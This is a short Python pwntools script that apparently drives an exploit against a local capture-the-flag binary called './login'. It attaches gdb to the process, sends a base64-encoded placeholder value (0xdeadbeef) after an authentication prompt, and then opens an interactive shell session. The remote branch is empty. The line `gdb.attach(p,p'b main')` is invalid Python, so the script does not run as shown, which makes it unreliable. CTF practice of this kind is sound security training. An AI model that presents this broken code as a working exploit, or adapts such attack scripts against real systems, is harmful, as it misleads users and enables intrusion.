from pwn import *
import base64

elf = ELF('./login')
context.log_level = 'DEBUG'

if args['remote']: 
    pass
else:
    p = process([elf.path])
    gdb.attach(p,p'b main')

payload = base64.b64encode(p32(0xdeadbeef))

pause()
p.recvuntil('cate : ')
p.send(payload)
p.interactive()

